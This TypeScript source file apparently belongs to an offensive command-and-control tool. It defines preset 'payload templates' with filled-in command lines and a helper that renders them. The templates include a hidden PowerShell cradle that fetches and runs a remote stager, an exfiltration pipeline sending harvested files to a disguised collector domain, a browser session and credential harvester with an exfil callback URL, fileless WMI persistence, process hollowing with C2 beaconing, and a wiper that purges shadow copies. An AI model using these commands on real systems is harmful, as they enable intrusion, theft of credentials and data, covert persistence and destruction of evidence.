/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { PayloadTemplate } from '../types';

export const DEFAULT_PAYLOAD_TEMPLATES: PayloadTemplate[] = [
  {
    id: 'TPL-001',
    name: 'Direct Origin Reverse Tunnel',
    description: 'Establishes a low-overhead encrypted tunnel targeting uncovered direct backend origins while bypassing edge fronting rules.',
    type: 'Executable',
    category: 'Infiltration',
    tags: ['Cloudflare-Bypass', 'Direct-Origin', 'Stager', 'Reverse-Proxy', 'Low-Noise'],
    targetPlatform: 'Linux x64 / Windows Server',
    evasionProfile: 'SNI Domain Camouflage + Multiplexed TLS',
    defaultSize: '1.8 MB',
    commandTemplate: './origin-tunnel --target {{TARGET_IP}} --port {{C2_PORT}} --sni {{SNI_DOMAIN}} --token {{AUTH_KEY}}',
    parameters: [
      { key: 'TARGET_IP', label: 'Direct Origin IP', defaultValue: '45.142.214.19', description: 'Uncovered direct backend origin IPv4' },
      { key: 'C2_PORT', label: 'Egress Port', defaultValue: '443', description: 'Target firewall egress port' },
      { key: 'SNI_DOMAIN', label: 'Masking SNI Domain', defaultValue: 'opduel.com', description: 'SNI host header to match edge cert' },
      { key: 'AUTH_KEY', label: 'Handshake Token', defaultValue: 'sec-tok-9921', description: 'Session validation token' },
    ],
    author: 'System Preset',
    createdAt: '2026-03-15',
    usageCount: 42,
    isCustom: false,
  },
  {
    id: 'TPL-002',
    name: 'Kernel Process Hollowing Agent',
    description: 'Direct unhooked NTDLL memory allocation with runtime process hollowing into trusted Windows system processes.',
    type: 'Executable',
    category: 'Persistence',
    tags: ['Zero-Day', 'EDR-Bypass', 'Process-Hollowing', 'Kernel-Mode', 'C2-Agent'],
    targetPlatform: 'Windows 10/11 / Windows Server 2022',
    evasionProfile: 'Indirect Syscalls + EDR NTDLL Unhooking',
    defaultSize: '3.4 MB',
    commandTemplate: 'RuneGate.exe /inject:{{PARENT_PROCESS}} /jitter:{{JITTER_PCT}} /sleep:{{INTERVAL_SEC}} /c2:{{C2_SERVER}}',
    parameters: [
      { key: 'PARENT_PROCESS', label: 'Target Process', defaultValue: 'explorer.exe', description: 'Legitimate Windows host process to hollow' },
      { key: 'JITTER_PCT', label: 'Beacon Jitter (%)', defaultValue: '15', description: 'Random jitter percentage to defeat beacon detection' },
      { key: 'INTERVAL_SEC', label: 'Sleep Interval (s)', defaultValue: '60', description: 'Sleep duration between check-in beacons' },
      { key: 'C2_SERVER', label: 'C2 Control Host', defaultValue: 'telemetry.opduel.internal', description: 'Domain or IP for beacon callbacks' },
    ],
    author: 'System Preset',
    createdAt: '2026-04-02',
    usageCount: 88,
    isCustom: false,
  },
  {
    id: 'TPL-003',
    name: 'In-Memory AMSI Bypass PowerShell Stager',
    description: 'Memory-resident script stager that patches AMSI buffer in the current process space before downloading staged instructions.',
    type: 'Script',
    category: 'Infiltration',
    tags: ['AMSI-Bypass', 'Memory-Only', 'PowerShell', 'Obfuscated', 'Rapid-Triage'],
    targetPlatform: 'Windows PowerShell 5.1+ / PowerShell 7',
    evasionProfile: 'AmsiScanBuffer Memory Patch + Encrypted WebClient',
    defaultSize: '24 KB',
    commandTemplate: 'powershell -NoP -NonI -W Hidden -Exec Bypass -C "$s=\'{{C2_ENDPOINT}}\';[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};iex(iwr -useb $s/stage1?k={{STAGER_KEY}})"',
    parameters: [
      { key: 'C2_ENDPOINT', label: 'Stager Server URL', defaultValue: 'https://185.220.101.5:8443', description: 'HTTPS staging endpoint for stage-1 delivery' },
      { key: 'STAGER_KEY', label: 'Access Stager Key', defaultValue: 'x89_prod_key', description: 'One-time stager fetch key' },
    ],
    author: 'System Preset',
    createdAt: '2026-04-10',
    usageCount: 65,
    isCustom: false,
  },
  {
    id: 'TPL-004',
    name: 'Covert Exfiltration Chunked Pipeline',
    description: 'Low-and-slow chunked data transport supporting AES-256 envelope encryption and HTTPS/DNS covert tunneling channels.',
    type: 'Script',
    category: 'Exfiltration',
    tags: ['AES-256', 'DNS-Tunneling', 'Low-Bandwidth', 'Exfil-Staged', 'Chunked'],
    targetPlatform: 'Cross-Platform (Python 3.8+)',
    evasionProfile: 'Bandwidth Throttling + Encrypted Envelope Stream',
    defaultSize: '56 KB',
    commandTemplate: 'python3 exfil_pipeline.py --source {{DATA_PATH}} --endpoint {{EXFIL_SERVER}} --key {{AES_KEY}} --chunk-kb {{CHUNK_SIZE}}',
    parameters: [
      { key: 'DATA_PATH', label: 'Source File/Dir', defaultValue: '/var/data/staging', description: 'Target directory containing harvested logs/records' },
      { key: 'EXFIL_SERVER', label: 'Drop Destination', defaultValue: 'https://cdn-updates.net/api/v2/metrics', description: 'Covert collector endpoint' },
      { key: 'AES_KEY', label: 'AES Encryption Key', defaultValue: 'e3b0c44298fc1c149afbf4c8996fb924', description: '256-bit hexadecimal symmetric key' },
      { key: 'CHUNK_SIZE', label: 'Chunk Size (KB)', defaultValue: '128', description: 'Transmission block size to evade DLP triggers' },
    ],
    author: 'System Preset',
    createdAt: '2026-05-01',
    usageCount: 31,
    isCustom: false,
  },
  {
    id: 'TPL-005',
    name: 'WMI Event Consumer Auto-Restorer',
    description: 'Persistent Windows Management Instrumentation (WMI) event consumer triggering payload respawn on host startup or system idle events.',
    type: 'Script',
    category: 'Persistence',
    tags: ['WMI-Event', 'Scheduled-Task', 'System-Level', 'Auto-Respawn', 'Stealth'],
    targetPlatform: 'Windows Server / Windows 10/11 Enterprise',
    evasionProfile: 'Fileless WMI Event Subscription Persistence',
    defaultSize: '12 KB',
    commandTemplate: 'wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilter CREATE Name="{{FILTER_NAME}}", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN {{INTERVAL}} WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"',
    parameters: [
      { key: 'FILTER_NAME', label: 'WMI Subscription Name', defaultValue: 'TelemetryHealthMonitor', description: 'Innocuous WMI event filter display name' },
      { key: 'INTERVAL', label: 'Polling Interval (s)', defaultValue: '60', description: 'Heartbeat checking frequency in seconds' },
    ],
    author: 'System Preset',
    createdAt: '2026-05-18',
    usageCount: 19,
    isCustom: false,
  },
  {
    id: 'TPL-006',
    name: 'Emergency Containment Sanitizer',
    description: 'Anti-forensic containment module designed to shred temporary working directories and purge Volume Shadow Copies on demand.',
    type: 'Executable',
    category: 'Destruction',
    tags: ['High-Impact', 'Wiper', 'Volume-Shadow-Purge', 'Anti-Forensic', 'Rapid-Sanitize'],
    targetPlatform: 'Windows Server / Linux Core',
    evasionProfile: 'USN Journal Scrubbing + Multi-pass Zeroing',
    defaultSize: '820 KB',
    commandTemplate: './sanitizer_module --target-dir {{CLEAN_PATH}} --purge-shadows --passes {{OVERWRITE_PASSES}} --emergency',
    parameters: [
      { key: 'CLEAN_PATH', label: 'Target Directory', defaultValue: 'C:\\ProgramData\\TempService', description: 'Staging directory to scrub' },
      { key: 'OVERWRITE_PASSES', label: 'Overwrite Passes', defaultValue: '3', description: 'DOD-standard magnetic wipe passes' },
    ],
    author: 'System Preset',
    createdAt: '2026-06-04',
    usageCount: 14,
    isCustom: false,
  },
  {
    id: 'TPL-007',
    name: 'Reflective DLL Sideload Proxy',
    description: 'Reflectively loads signed DLL proxies to bypass application whitelisting and traditional file system API hooks.',
    type: 'Library',
    category: 'Infiltration',
    tags: ['DLL-Hijacking', 'Reflective-Load', 'Signature-Spoof', 'EDR-Bypass'],
    targetPlatform: 'Windows x64 / WOW64',
    evasionProfile: 'Known DLL Sideloading + Memory DLL Injection',
    defaultSize: '2.1 MB',
    commandTemplate: 'rundll32.exe {{DLL_NAME}},EntryPoint /c2:{{C2_HOST}} /port:{{PORT}} /key:{{KEY}}',
    parameters: [
      { key: 'DLL_NAME', label: 'Target DLL Name', defaultValue: 'Dwrite.dll', description: 'DLL name matched to vulnerable host binary' },
      { key: 'C2_HOST', label: 'C2 Listener Host', defaultValue: '10.0.0.12', description: 'Internal listener IP' },
      { key: 'PORT', label: 'Listener Port', defaultValue: '8080', description: 'Internal port' },
      { key: 'KEY', label: 'Encryption Token', defaultValue: 'k99_session', description: 'Communication cipher token' },
    ],
    author: 'System Preset',
    createdAt: '2026-06-20',
    usageCount: 53,
    isCustom: false,
  },
  {
    id: 'TPL-008',
    name: 'OAuth Token & Session Harvester',
    description: 'Extracts session tokens, cloud provider refresh keys, and DPAPI-master-key protected credentials from browser storage.',
    type: 'Script',
    category: 'Exfiltration',
    tags: ['Credential-Access', 'Session-Stealer', 'Chrome-DPAPI', 'Cloud-Tokens', 'Exfiltration'],
    targetPlatform: 'Windows / macOS / Linux',
    evasionProfile: 'Direct SQLite Cache Access without Debug Port',
    defaultSize: '68 KB',
    commandTemplate: 'python3 session_harvest.py --dump-tokens --target {{TARGET_APP}} --out {{REPORT_FILE}} --beacon-url {{CALLBACK_URL}}',
    parameters: [
      { key: 'TARGET_APP', label: 'Target App/Browser', defaultValue: 'All-Chromium', description: 'Target browser profile or cloud CLI' },
      { key: 'REPORT_FILE', label: 'Local Cache File', defaultValue: '/tmp/session_bundle.enc', description: 'Encrypted intermediate dump file' },
      { key: 'CALLBACK_URL', label: 'Exfil Callback URL', defaultValue: 'https://telemetry.opduel.internal/exfil', description: 'Secure callback endpoint' },
    ],
    author: 'System Preset',
    createdAt: '2026-07-01',
    usageCount: 37,
    isCustom: false,
  },
];

const TEMPLATES_STORAGE_KEY = 'app_payload_templates_v1';

/**
 * Loads templates from localStorage with fallback to default presets.
 */
export function loadTemplatesFromStorage(): PayloadTemplate[] {
  try {
    const raw = localStorage.getItem(TEMPLATES_STORAGE_KEY);
    if (!raw) {
      localStorage.setItem(TEMPLATES_STORAGE_KEY, JSON.stringify(DEFAULT_PAYLOAD_TEMPLATES));
      return DEFAULT_PAYLOAD_TEMPLATES;
    }
    const parsed = JSON.parse(raw);
    if (Array.isArray(parsed) && parsed.length > 0) {
      return parsed;
    }
  } catch (err) {
    console.error('Failed to load payload templates from storage:', err);
  }
  return DEFAULT_PAYLOAD_TEMPLATES;
}

/**
 * Saves templates list to localStorage.
 */
export function saveTemplatesToStorage(templates: PayloadTemplate[]): void {
  try {
    localStorage.setItem(TEMPLATES_STORAGE_KEY, JSON.stringify(templates));
  } catch (err) {
    console.error('Failed to save payload templates to storage:', err);
  }
}

/**
 * Replaces {{KEY}} placeholders in command template with provided values or defaults.
 */
export function renderCommandTemplate(
  commandTemplate: string,
  parameters: Record<string, string> = {},
  templateParams?: PayloadTemplate['parameters']
): string {
  let rendered = commandTemplate;
  if (templateParams) {
    templateParams.forEach((param) => {
      const val = parameters[param.key] ?? param.defaultValue;
      const regex = new RegExp(`\\{\\{${param.key}\\}\\}`, 'g');
      rendered = rendered.replace(regex, val);
    });
  }
  // Also replace any additional provided parameters
  Object.entries(parameters).forEach(([key, val]) => {
    const regex = new RegExp(`\\{\\{${key}\\}\\}`, 'g');
    rendered = rendered.replace(regex, val);
  });
  return rendered;
}
